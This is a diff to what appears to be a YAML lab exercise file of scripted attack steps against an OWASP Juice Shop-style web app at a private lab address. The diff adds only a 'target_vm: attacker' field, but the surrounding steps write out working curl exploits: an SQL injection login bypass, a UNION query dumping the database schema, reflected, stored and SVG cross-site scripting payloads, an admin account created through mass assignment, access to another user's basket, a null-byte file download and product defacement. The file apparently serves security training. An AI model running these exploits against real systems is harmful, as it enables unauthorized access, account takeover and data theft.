@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: token
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -m json.tool'
   risk_level: medium
 - order: 2
@@ -37,6 +38,7 @@ steps:
     type: output_contains
     expect: email
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json,base64; t=json.load(sys.stdin)[''authentication''][''token''];
     p=t.split(''.'')[1]; p+=''=''*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))"'
   risk_level: low
@@ -51,6 +53,7 @@ steps:
     type: output_contains
     expect: iframe
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'
   risk_level: medium
 - order: 4
@@ -65,6 +68,7 @@ steps:
     type: output_contains
     expect: email
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/api/Users -H ''Content-Type: application/json'' -d ''{"email":"hacker@test.com","password":"hacker123","passwordRepeat":"hacker123","role":"admin","securityQuestion":{"id":1,"question":"test"},"securityAnswer":"test"}''
     | python3 -m json.tool'
   risk_level: medium
@@ -79,6 +83,7 @@ steps:
     type: output_contains
     expect: SELECT
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
   risk_level: medium
 - order: 6
@@ -94,6 +99,7 @@ steps:
     type: output_contains
     expect: comment
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}'' | python3 -m
     json.tool'
@@ -109,6 +115,7 @@ steps:
     type: output_contains
     expect: name
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/ftp/package.json.bak%2500.md'
   risk_level: medium
 - order: 8
@@ -123,6 +130,7 @@ steps:
     type: output_contains
     expect: rating
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"comment":"Zero star","rating":0}'' | python3 -m json.tool'
   risk_level: medium
@@ -138,6 +146,7 @@ steps:
     type: output_contains
     expect: password
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && curl -s ''http://10.20.30.80:3000/rest/user/change-password?current=a&new=newpass123&repeat=newpass123'' -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN'
   risk_level: medium
@@ -153,6 +162,7 @@ steps:
     type: output_contains
     expect: Products
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool'
   risk_level: medium
@@ -168,6 +178,7 @@ steps:
     type: output_contains
     expect: description
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && curl -s -X PUT http://10.20.30.80:3000/api/Products/1 -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" -d ''{"description":"Hacked by attacker"}'' | python3 -m json.tool'
   risk_level: medium
@@ -184,6 +195,7 @@ steps:
     type: output_contains
     expect: svg
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && echo ''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text x="0" y="20">XSS</text></svg>'' > /tmp/xss.svg && curl -s -X POST http://10.20.30.80:3000/profile/image/file -H "Authorization:
     Bearer $TOKEN" -H ''Cookie: token=''$TOKEN -F ''file=@/tmp/xss.svg;type=image/svg+xml'''
@@ -200,6 +212,7 @@ steps:
     type: output_contains
     expect: script
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && curl -s http://10.20.30.80:3000/rest/saveLoginIp -H "Authorization: Bearer $TOKEN" -H ''True-Client-IP: <script>alert(1)</script>'''
   risk_level: medium
@@ -215,6 +228,7 @@ steps:
     type: output_contains
     expect: html
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && curl -s http://10.20.30.80:3000/administration -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN | head -50'
   risk_level: medium
@@ -231,6 +245,7 @@ steps:
     type: output_contains
     expect: Web Attack Report
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n- IDOR: /rest/basket/2 접근\n- Admin panel 직접 접근\n- Mass Assignment: role=admin\n\n[A03: Injection]\n- SQL Injection: login
     bypass\n- UNION SQLi: DB schema 추출\n- XSS: Reflected/Stored/DOM\n- Header Injection\n\n[A04: Insecure Design]\n- 0-star rating 제출\n- GET 비밀번호 변경(CSRF)\n\n[A05: Security Misconfiguration]\n- Null Byte
     Injection으로 파일 다운로드\n- 관리자 설정 API 노출'' > /tmp/web_attack_report.txt && cat /tmp/web_attack_report.txt'
